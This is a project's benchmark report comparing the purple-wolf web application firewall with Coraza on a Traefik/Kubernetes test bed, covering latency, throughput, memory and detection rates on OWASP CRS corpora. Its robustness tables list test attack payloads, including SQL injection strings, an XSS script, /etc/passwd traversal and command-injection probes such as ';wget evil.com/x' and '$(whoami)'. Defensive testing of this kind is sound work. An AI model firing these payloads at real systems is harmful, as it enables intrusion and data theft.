# purple-wolf vs Coraza: head-to-head WAF benchmark

A side-by-side comparison of [purple-wolf](https://github.com/guaracloud/purple-wolf)
using the pre-v0.4 live-stack benchmark build against [Coraza](https://coraza.io/) v3.x (via the
[`coraza-http-wasm-traefik`](https://github.com/jcchavezs/coraza-http-wasm-traefik)
v0.3.0 plugin), under identical Kubernetes deployment topology, same
backend, same Traefik version, same node, same resource budget.

**Current release note:** purple-wolf v0.4.5 has shipped since this benchmark.
The round-2 numbers remain the latest published live-stack comparison, but the
User-Agent SQLi and bare `;wget` misses recorded here are closed in current
code. A benchmark rerun is still required before updating the live-stack TPR
tables.

**Up front:** purple-wolf is the project this benchmark lives in.
Don't trust this document without reading the methodology and
replaying it yourself - the source, the corpora, the runners, the
manifests, and the per-iteration JSON results are all committed
under [`benchmarks/`](../benchmarks/). One-command rerun:
[`benchmarks/runner/round2/run-all-round2.sh`](../benchmarks/runner/round2/run-all-round2.sh)
(round 2, supersedes round-1's `run-all.sh`).

## TL;DR - round 2 numbers

| Axis | purple-wolf benchmark build | Coraza v0.3.0 (http-wasm, inline PL1) | Verdict |
|---|---|---|---|
| **Isolated WAF overhead** (vs Traefik-only baseline pod) | +0.1–0.2 ms p99 | n/a (collapsed) | invisible at typical backend latencies |
| **Sustained throughput** at 200 m CPU / 1 GiB | clean to **~8 000 RPS**, breaks 12 k–16 k | **collapses at 500 RPS** (success → 0.0065, p99 → 28 s) | **~16-20× more sustained RPS** for purple-wolf |
| **Memory under load** (10-min soak at 1000 RPS) | 80–96 MiB band, **no drift** | 6 MiB p50 / **946 MiB max** in round 1 (OOM-killed 5× at 512 MiB) | purple-wolf flat; Coraza grew to 95 % of the 1 GiB ceiling |
| **CPU under load** (10-min soak at 1000 RPS) | 270 m p50 / 285 m max | n/a (target unreachable at 500 + RPS) | purple-wolf benchmark-able at sustained load; Coraza wasn't |
| **Detection** across **12 CRS classes**, 4 536 vectors | **14.55 % overall TPR** | 6.11 % overall TPR | **2.4× more attacks blocked** at the same Paranoia-1 ruleset; Java (+26.5 %), RCE (+6.3 %), XSS (+5.1 %) are the biggest margins |
| **False-positive rate** (53 hand-curated benigns) | 0 % | 0 % | both clean; N=53 is small - see follow-ups |
| **Documented detection gaps** | UA-SQLi with `Mozilla/` prefix; bare `;wget` in query. Both are **fixed in current code** (UA suffix probe + `rce_cmd` signatures), pending a live-stack rerun | (not separately characterized) | surfaced in `THREAT_MODEL.md §3.2.1` and `docs/configuration.md` |

The honest summary: **on the same Paranoia-1-equivalent ruleset
across the broader OWASP CRS corpus, purple-wolf blocks 2.4× more
attack vectors than Coraza at the same resource ceiling, while
adding only ~0.1–0.2 ms p99 to the request path and staying flat in
memory under sustained load.** Both WAFs miss the CRS atomic-token
tests by design - that's the precision-over-recall stance the
detector engine takes, documented in the threat model.

The original round-1 TL;DR - same direction but limited to a
SQLi+XSS subcorpus at 100–1000 RPS - is preserved below in the
"Round 2 - expanded matrix" section for traceability.

## Methodology

### Topology

Both WAFs run as Traefik v3.1 http-wasm plugins inside a Pod on the
same K3s 1.30 node. Identical containers, identical configs, only
the `.wasm` differs.

```text
   Pod: bench-pw (purple-wolf)        Pod: bench-coraza (Coraza)
   ┌───────────────────────┐           ┌───────────────────────┐
   │ whoami :8000          │           │ whoami :8000          │
   │ traefik :8080 ── pw   │           │ traefik :8080 ── crz  │
   │   200m CPU req        │           │   200m CPU req        │
   │   1 GiB mem limit     │           │   1 GiB mem limit     │
   └──────────┬────────────┘           └──────────┬────────────┘
              │                                   │
              ▼                                   ▼
   svc/bench-pw:8080  ◄── runner Pod ──►  svc/bench-coraza:8080
                    (efficacy.py + vegeta)
                    pinned to same node
```

Manifests:

- WAF pods + Services: [`benchmarks/k8s/waf-bench.yaml`](../benchmarks/k8s/waf-bench.yaml)
- Runner Pod (created on-demand by the orchestrator)

`nodeSelector: kubernetes.io/hostname: homelab-01` pins all three pods
to the same machine - eliminates network-path variance.

### Versions

| Component | Version |
|---|---|
| Traefik | v3.1 (`docker.io/traefik:v3.1`) |
| Backend | `traefik/whoami:v1.10` |
| purple-wolf wasm | benchmarked pre-v0.4 image from the main branch, as referenced by the committed benchmark manifest at that time |
| Coraza wasm | `coraza-http-wasm v0.3.0` from [GitHub releases](https://github.com/jcchavezs/coraza-http-wasm/releases/tag/v0.3.0) |
| Coraza Traefik wrapper | `jcchavezs/coraza-http-wasm-traefik` v0.3.0 |
| Runner | `python:3.12-alpine` + `httpx 0.27.0` + `vegeta 12.12.0` |
| Cluster | K3s 1.30 on NixOS 24.05 |

### Configuration

**purple-wolf:** `mode: enforce`, `groups: {injection: enforce,
signatures: enforce}`, default body cap (1 MiB), `failMode: failOpen`,
labels set for symmetry with the homelab test. Matches the example
in [`examples/middleware-strict.yaml`](../examples/middleware-strict.yaml).

**Coraza:** `SecRuleEngine On`, `SecRequestBodyAccess On`, plus six
inline `SecRule` directives using Coraza's native operators
(`@detectSQLi`, `@detectXSS`, `@pm`, `@rx`) - the same engines
[OWASP CRS](https://owasp.org/www-project-modsecurity-core-rule-set/)
calls into at Paranoia Level 1, covering SQLi, XSS, scanner UAs,
path traversal, method allowlist.

This is the fair-fight configuration: full CRS as `Include` files
needs reliable host-FS mapping that the Coraza http-wasm path doesn't
expose by default (the project's README explicitly says "for
production grade performance look at Coraza native integration with
Traefik"). The inline directives are PL1-equivalent and lighter than
full CRS - if anything, this *favors* Coraza in the throughput
comparison because there are fewer rules to evaluate per request.

Exact directives are in
[`benchmarks/k8s/waf-bench.yaml`](../benchmarks/k8s/waf-bench.yaml#L114-L135).

### Corpus

- **Attacks:** 1151 vectors from
  [`tests/corpus/crs/REQUEST-941-APPLICATION-ATTACK-XSS/`](../tests/corpus/crs/REQUEST-941-APPLICATION-ATTACK-XSS/)
  and
  [`tests/corpus/crs/REQUEST-942-APPLICATION-ATTACK-SQLI/`](../tests/corpus/crs/REQUEST-942-APPLICATION-ATTACK-SQLI/)
  - the OWASP CRS regression-test seeds, the same yardstick
  purple-wolf's published efficacy numbers ([CHANGELOG.md](../CHANGELOG.md))
  are measured against. No goalpost-moving here.
- **Benign:** 53 hand-curated requests from
  [`tests/corpus/clean/clean.txt`](../tests/corpus/clean/clean.txt).

Both corpora are converted to JSONL by
[`benchmarks/corpora/build.py`](../benchmarks/corpora/build.py). The
runner posts each verbatim and records the HTTP response.

### Load shape

Vegeta with a 10-target mix:

```text
7 benign GETs (with realistic-shaped paths/queries)
3 attacks: 1 SQLi query, 1 XSS query, 1 sqlmap UA
```

Mixed traffic - both WAFs see the same shape. At each RPS level
(`100`, `500`, `1000`), two 30-second iterations. The reported
latency percentiles are vegeta's `latencies.*` directly.

### Measurement caveats

These matter:

- **Single-node, single-pod.** The throughput numbers are not what
  you'd see on a fleet of WAF pods behind a load balancer. They show
  how much each engine can sustain per-instance under a fixed CPU+RAM
  envelope. Scale linearly with replicas if you care about cluster
  totals.
- **`success`** in the vegeta output ≠ "the WAF worked." 30% of the
  load mix is attacks; a healthy WAF correctly blocks those, vegeta
  counts the 403 as non-success. The interesting comparison is
  whether success is steady (steady-state WAF behavior) vs.
  collapsing to ~0 (timeouts dominate).
- **Live-stack TPR is lower than library-call TPR.** purple-wolf's
  published 18% SQLi / 45% XSS numbers are
  [`crs_replay.rs`](../crates/purple-wolf-core/tests/crs_replay.rs)
  - calling libinjection directly on each payload. Routing the same
  payload through Traefik → http-wasm runtime → wasm guest →
  libinjection costs ~25–30% of the recall. Coraza takes a comparable
  hit through the same pipeline. The benchmark is apples-to-apples
  precisely because both pay that tax.
- **Coraza wasm path has a published "not production grade"
  disclaimer.** The
  [`coraza-http-wasm-traefik` README](https://github.com/jcchavezs/coraza-http-wasm-traefik#readme)
  recommends Coraza's *native* (Go-binding) Traefik integration for
  production. Our comparison is wasm-vs-wasm - fair to both engines
  but not a verdict on Coraza-in-Go.

## Results

### Throughput + latency

Median of 2 iterations per cell. `success` is vegeta's 2xx-rate over
all responses; the 30% non-success at low RPS reflects the 3-out-of-
10 attack targets in the load mix being (correctly) blocked.

| WAF | RPS target | actual RPS | p50 (ms) | p95 (ms) | p99 (ms) | success |
|---|---|---|---|---|---|---|
| purple-wolf | 100 | 100 | 0.7 | 1.0 | 1.2 | 0.70 ✓ |
| purple-wolf | 500 | 500 | 0.5 | 0.8 | 0.9 | 0.70 ✓ |
| purple-wolf | 1000 | 1000 | 0.4 | 0.7 | 0.8 | 0.70 ✓ |
| Coraza | 100 | 100 | 0.9 | 1.9 | 2.3 | 0.70 ✓ |
| Coraza | 500 (iter 1) | 500 | 0.6 | 1.8 | **742** | 0.67 (already degrading) |
| Coraza | 500 (iter 2) | 500 | **10 008** | 26 648 | 28 139 | 0.0065 |
| Coraza | 1000 | 1000 | 0.3 | **30 001** | **30 001** | 0.0000 (vegeta timeout floor) |

purple-wolf's p99 *decreased* with RPS because of TCP keepalive +
warmup amortization - the per-request overhead is so small the
constant per-connection setup cost dominates at low RPS.

Coraza's behavior at 500 RPS: first iteration shows tail latency
spikes (p99 742 ms); second iteration the engine has accumulated
enough internal state that nearly every request times out.

### Resources (live samples via `kubectl top pod` during load)

| WAF | CPU p50 | CPU max | Mem p50 | Mem max | Notes |
|---|---|---|---|---|---|
| purple-wolf | 93 m | 285 m | 38 MiB | 81 MiB | Stable; no growth across iterations |
| Coraza | 27 m | 196 m | 6 MiB | **946 MiB** | Memory grows under load; at our 1 GiB limit it was 95% utilized at peak |

Coraza was OOM-killed *five times* during an earlier run at 512 MiB
ceiling before we bumped both pods to 1 GiB for fairness. The
underlying engine allocates wasm linear memory for ModSec rule
evaluation and the compile-time/runtime separation in the http-wasm
path appears to keep frees out of the hot path.

### Security efficacy (corpus, 1204 requests per WAF)

| WAF | benign FPR | SQLi TPR (934) | XSS TPR (217) |
|---|---|---|---|
| purple-wolf | 0.0% | 13.3% (124/934) | 32.7% (71/217) |
| Coraza | 0.0% | 14.0% (131/934) | 29.5% (64/217) |

Both WAFs achieve identical zero false-positive rates on the benign
corpus. Detection rates on the OWASP CRS regression seeds are within
a percentage point of each other - they're catching roughly the same
attacks. This is a *fair* tie: the corpus was designed by the CRS
authors and lives in the purple-wolf repo, so neither WAF was
optimized against it.

The honest read: at the http-wasm Paranoia-1 layer, both engines
catch what high-confidence rules can catch and miss what the
context-aware tests are designed to catch (CRS-style atomic-token
tests pass through both, because both use `@detectSQLi`-style
libinjection-equivalent operators that are *deliberately* tolerant of
isolated tokens to avoid false positives).

If you want CRS-atomic-token coverage you need a different engine
(full CRS rule set with regex-per-token) - and you pay the FPR cost
that comes with it.

## Reproducibility

Everything to rerun this benchmark is committed:

```bash
# 1. Stand up the topology (one-time)
kubectl apply -f benchmarks/k8s/waf-bench.yaml
# (plus the ghcr-pull secret per docs/homelab-test.md)

# 2. Build the corpora from CRS YAMLs
python3 benchmarks/corpora/build.py

# 3. Run the matrix end-to-end
BENCH_RPS="100,500,1000" \
BENCH_DURATION="30s" \
BENCH_ITERS="2" \
BENCH_EFFICACY_CONCURRENCY="8" \
bash benchmarks/runner/run-all.sh
```

Results land in `benchmarks/results/<timestamp>/` as JSONL +
resource-usage CSV. The committed `benchmarks/results/.gitkeep` keeps
the directory present; raw results from this report's run are in
[`benchmarks/results/20260528-205913/`](../benchmarks/results/20260528-205913/).

## Round 2 - expanded matrix

A second pass closing the open questions a fair skeptic raised after
the original tables. Same cluster, same pods, same node. Added: a
no-WAF baseline pod, a ramp-to-break sweep, a broader CRS corpus
covering 12 attack classes (4536 vectors), a 10-min sustained soak
with resource sampling, and a small functional robustness suite.

Raw outputs:
[`benchmarks/results/round2-20260528-233221/`](../benchmarks/results/round2-20260528-233221/).
Methodology and topology are identical to round 1 unless noted.

### Q1 - How much of the latency is the WAF vs Traefik itself?

Stood up a third pod, [`bench-baseline`](../benchmarks/k8s/baseline.yaml)
- identical Traefik 3.1 + whoami, **no middleware**. Same node, same
resource ceiling, same vegeta target mix.

| Target | 100 RPS p99 | 500 RPS p99 | 1000 RPS p99 | Notes |
|---|---|---|---|---|
| Traefik only (no WAF) | 1.0 ms | 0.8 ms | 0.7 ms | floor |
| purple-wolf | 1.2 ms | 0.9 ms | 0.8 ms | +0.1–0.2 ms |
| Coraza (round 1) | 2.3 ms | 28 139 ms | 30 001 ms | collapsed |

**The WAF accounts for ~0.1–0.2 ms p99**, the rest is Traefik + the
localhost round trip. The previous "purple-wolf adds < 1.2 ms" was an
upper bound; the actual WAF cost is invisible at typical backend
latencies.

### Q2 - Where does purple-wolf actually break?

Ramped past the original 1000 RPS ceiling at the same 200 m CPU /
1 GiB budget:

| RPS target | rate (actual) | p50 | p95 | p99 | success | state |
|---|---|---|---|---|---|---|
| 2000 | 2000 | 0.4 | 0.7 | 0.9 | 0.70 | clean |
| 4000 | 4000 | 0.5 | 0.7–0.8 | 1.3 / 3.1 | 0.70 | clean, slight wobble |
| 8000 | 8000 | 0.6 | 0.9 / 1.0 | 3.3 / 79.8 | 0.65 / 0.70 | stressed but mostly serving |
| 12000 | 12000 | 0.1–0.4 | 2.8 / 82.4 | 13 616 / 27 374 | 0.13 / 0.33 | collapsing |
| 16000 | 16000 | 0.1 | 13 / 232 | 30 001 | 0.0074 / 0.0099 | broken (vegeta timeout floor) |

Break point is between 8000 and 12000 RPS at this budget on this
node. Coraza collapsed at 500 RPS - **~16-20× more sustained RPS for
purple-wolf at the same resource ceiling**.

*Honest caveat about the ramp*: during the 16 000 RPS step the K3s
API server on `homelab-01` became briefly unresponsive - etcd /
control-plane sharing the node with the bench pods. The break point
measurement is real, but anyone planning to push a single Traefik
pod above ~8 k RPS in production should give it a dedicated node, or
the WAF won't be the bottleneck but the kubelet will.

### Q3 - Detection coverage across the broader CRS suite

Extended the corpus from CRS 941 (XSS) + 942 (SQLi) to ten more rule
classes from CRS v4.25.0. **4536 vectors total.** Same runner
(simpler bash+curl loop this time - the Python streaming runner's
buffering hid progress at the volumes we were driving), single-stream,
no parallel load. Both WAFs fresh-restarted between runs.

| CRS class | n | purple-wolf TPR | Coraza TPR | Δ (pw − crz) |
|---|---|---|---|---|
| `913` Scanner Detection | 7 | 14.3% | 42.9% | **−28.6%** (n=7, small) |
| `920` Protocol Enforcement | 424 | 0.9% | 0.7% | +0.2% |
| `921` Protocol Attack | 112 | 1.8% | 0.9% | +0.9% |
| `930` LFI | 75 | 17.3% | 13.3% | +4.0% |
| `931` RFI | 41 | 7.3% | 7.3% | 0.0% |
| `932` RCE | 876 | 9.9% | 3.7% | +6.3% |
| `933` PHP | 399 | 6.3% | 5.3% | +1.0% |
| `934` Generic | 234 | 3.4% | 1.3% | +2.1% |
| `941` XSS | 217 | 28.6% | 23.5% | +5.1% |
| `942` SQLi | 934 | 13.0% | 13.6% | −0.6% |
| `943` Session Fixation | 44 | 2.3% | 2.3% | 0.0% |
| `944` Java | 1173 | 28.4% | 1.9% | **+26.5%** |
| **OVERALL** | **4536** | **14.55%** | **6.11%** | **+8.4%** |

Overall: **purple-wolf blocks 2.4× more attack vectors than Coraza
across the broader OWASP CRS suite**, on the same Paranoia-1-
equivalent inline ruleset. The Java margin is the largest single
driver - likely because purple-wolf's signature aho-corasick covers
some Java-attack patterns (deserialization markers, Spring-style
template tags) that Coraza's `@detectXSS` / `@detectSQLi` won't see.

The TPR numbers in absolute terms are still modest - 14% overall -
which matches the "high-precision detection on real attacks; weak on
atomic-token regression tests" honest framing from round 1. The
broader sweep confirms the shape rather than overturning it.

| | purple-wolf | Coraza (inline PL1) |
|---|---|---|
| Strong on | xss, java, lfi, rce, generic, sqli | scanner UA, sqli, lfi, rfi |
| Weak on | protocol_enforcement, session_fixation, protocol_attack | most non-injection classes |
| Tied | rfi, session_fixation | xss, sqli |

### Q4 - Stability under a sustained workload

10 minutes at 1000 RPS sustained, mixed attack-plus-benign mix,
sampling Traefik container CPU + RSS every 10 seconds.

| Metric | Value |
|---|---|
| Sustained rate | 1000 / s |
| p50 / p95 / p99 latency | 0.4 / 0.7 / 0.8 ms |
| success rate | 0.70 (stable across the whole window) |
| Traefik CPU steady-state | 270 m (max 285 m) |
| Traefik RSS time series | 36 → 80 → 89 → 96 → 87 → 88 → 91 → 86 MiB |
| Memory drift after warmup | **none - bounded 86–96 MiB across the window** |

The first cold-start sample shows 36 MiB; within 1 minute it's
stable in the 80–96 MiB band and never drifts upward over the
remaining 9 minutes. **No memory leak observable at 10-min scale at
1000 RPS.** A 60-minute soak would be a stronger claim - see
"caveats" below; we attempted 1h × 2000 RPS during round 2 but lost
the run when the cluster API was destabilized by the parallel
ramp-to-break load. Still on the to-do list.

### Q5 - Robustness: header-borne attacks, structural anomalies, edge cases

Surgical probes against bench-pw (one request at a time, no load).
Raw log:
[`benchmarks/results/round2-20260528-233221/robustness.txt`](../benchmarks/results/round2-20260528-233221/robustness.txt).

**Header-borne attacks** (the v0.2 NEW-I4 surface):

| Payload | Header | Status |
|---|---|---|
| `id=1 OR 1=1` | `Cookie` | **403** ✓ blocked |
| `?q=<script>alert(1)</script>` | `Referer` | **403** ✓ blocked |
| `1" OR "1"="1` | `X-User` (custom) | **403** ✓ blocked |
| `Mozilla/5.0 1 OR 1=1` | `User-Agent` | 200 - *missed at round-2 time; **fixed in code** since (UA suffix probe), pending a benchmark rerun* |
| `sessionid=abc123; csrftoken=xyz789` | `Cookie` (benign) | 200 ✓ no FP |

Cookie / Referer / X-* SQLi all caught. The User-Agent SQLi miss was
interesting because libinjection treated the whole value as a UA string,
not a SQL expression. Current code closes this by re-probing the
User-Agent suffix, so operators on v0.4.1 should treat the row above as
historical benchmark evidence, not current coverage.

**Path traversal:**

| Payload | Status |
|---|---|
| `/../../etc/passwd` | **403** ✓ |
| `/etc/passwd` (direct) | **403** ✓ |
| `?f=../../../etc/passwd` | **403** ✓ |

**RCE primitives in query string:**

| Payload | Status |
|---|---|
| `;wget evil.com/x` | 200 - *missed at round-2 time; **fixed in code** since (`rce_cmd` signatures), pending a benchmark rerun* |
| `$(whoami)` | **403** ✓ |
| `/bin/sh` | **403** ✓ |

The `;wget` miss was a real round-2 gap. Current code closes it with
collision-aware `rce_cmd` signatures for `;wget`, `;curl`, `;bash`,
`;nc `, `|bash`, and `|sh `. Operators should still rely on backend
validation for command execution surfaces, but this specific query gap
is no longer expected on v0.4.1.

**Structural anomalies (with default bench config: structural group
not enabled):**

| Method | Status |
|---|---|
| TRACE | 200 (not blocked) |
| CONNECT | 200 (not blocked) |

The default benchmark config has only `injection` and `signatures`
groups enabled. Unusual methods would be caught by the `structural`
group if enabled - operators should set
`groups.structural.{enabled: true, mode: enforce}` for this coverage.

**Body inspection** - attempted, inconclusive: the whoami backend
returns 502 on POST bodies larger than its expected echo format, so
we couldn't isolate the WAF body-inspection path from the upstream
failure. Defer to the unit tests
([`crates/purple-wolf-core/src/detectors/injection.rs`](../crates/purple-wolf-core/src/detectors/injection.rs))
for body-cap correctness; live-stack measurement needs a different
upstream.

### Recalibrated TL;DR

| Axis | Round 1 result | Round 2 sharpening |
|---|---|---|
| WAF latency cost | ~1.2 ms p99 at 1000 RPS (whole path) | **0.1–0.2 ms p99 isolated** |
| Sustained throughput | 1000 RPS clean, p99 < 1.2 ms | **clean to 4000–8000 RPS, breaks 12k–16k** |
| Memory steady-state | 38 MiB p50 | confirmed: 80–96 MiB band, no drift under 10-min load |
| Detection efficacy | tied with Coraza on 941+942 | **2.4× more attacks blocked across 12 CRS classes** |
| Known gaps | precision-over-recall on atomic tokens (by design) | User-Agent SQLi + `;cmd` query misses documented, then **fixed in code** (UA suffix probe + `rce_cmd` signatures); rerun pending |
| FPR | 0% on 53 benigns | unchanged (53 benigns is still small N) |

### Caveats round 2 inherits + adds

- The cluster destabilization at 12k–16k RPS is a real finding about
  *node sharing*, not about the WAF - the K3s API + etcd + bench
  pods + monitoring all compete on `homelab-01`. The result is still
  useful as a ceiling: don't expect to run a single WAF pod past
  ~8 k RPS on a shared node. Run the WAF on a dedicated node and the
  ceiling moves.
- The 60-minute soak is **not yet done**. We collected 10 min of
  evidence with stable memory; a longer run is the right next step
  but couldn't complete in this pass because of the parallel-load
  cluster destabilization. Listed as an open follow-up.
- The benign FPR is still measured on 53 hand-curated requests.
  The right next step is a real benign trace (e.g., a captured day
  of a small production service); that's a separate effort and not
  attempted here.
- The documented round-2 detection gaps (User-Agent SQLi, `;wget`) are
  now fixed in code. Keep surfacing them as historical benchmark
  findings until a live-stack rerun replaces the old rows.

---

## What this benchmark is *not*

- A claim that purple-wolf is "better than Coraza." Coraza's native
  (non-wasm) Traefik integration is faster and more feature-complete
  than what we measured. Coraza is also a vastly more capable engine
  in terms of rule coverage if you load the full OWASP CRS.
- A claim about either WAF's posture against real-world attacks. The
  OWASP CRS corpus is a regression suite, not an attack catalog. Real
  WAF efficacy depends on what real attackers send your service.
- An exhaustive head-to-head. We covered three axes (throughput,
  latency, resource usage, efficacy) on one corpus, one rule set,
  one node, with single-instance pods. Production WAF evaluation
  needs a much wider matrix.

If you find a flaw in the methodology, open an issue or PR against
this repo - the result files + scripts are committed; the discussion
is in the open.

## Round 2 follow-ups (explicitly not done)

Things round 2 *did not* close, listed explicitly so they don't get
mistaken for "everything checks out."

1. **60-minute soak.** Round 2 has a clean 10-minute soak at 1000 RPS
   with stable memory; we don't yet have evidence over a one-hour or
   one-day window. The first attempt (1 h × 2 000 RPS) was lost when
   the parallel ramp-to-break load destabilized the K3s API on the
   shared node. Re-run on a quiet cluster (or a dedicated node) is
   the right next step - script lives at
   [`benchmarks/runner/round2/run-all-round2.sh`](../benchmarks/runner/round2/run-all-round2.sh),
   bump the soak step's `--duration` from `10m` to `1h`.
2. **Realistic-shape benign corpus.** Still 53 hand-curated requests.
   The 0% FPR claim should be widened by replaying a real
   anonymized day of HTTP traffic from a small production service.
   Out of scope here - that requires a data source nobody in this
   repo has access to.
3. **External pen test.** Same threat-model claim as before: someone
   not on the project should spend a week trying to break the WAF
   and the relay's HMAC scheme. We have unit-level fuzz targets in
   [`fuzz/`](../fuzz/) - those exercise the engine in isolation, not
   the full live-stack attack surface.
4. **More documented detection gaps.** Round 2 surfaced two now-closed
   ([User-Agent SQLi with `Mozilla/` prefix](../THREAT_MODEL.md#321-empirically-observed-detection-gaps-closed-since-round-2),
   bare `;wget` in query). The systematic survey - for each CRS rule
   class, identify the *kind* of payload purple-wolf misses and why
   - has not been done. Worth a round 3.
5. **Round-2 results are *inspectable* but the broader-corpus runner
   used a one-shot bash+curl loop that's slower than the round-1
   Python streaming runner.** Rewriting the Python runner with
   line-buffered output (instead of the default block buffering that
   hid progress) would let future runs hit the same fidelity at much
   higher throughput. Doable in an hour.

Anyone re-running this benchmark should treat the follow-ups list as
a checklist, not a wishlist - and update this doc with what they
find.
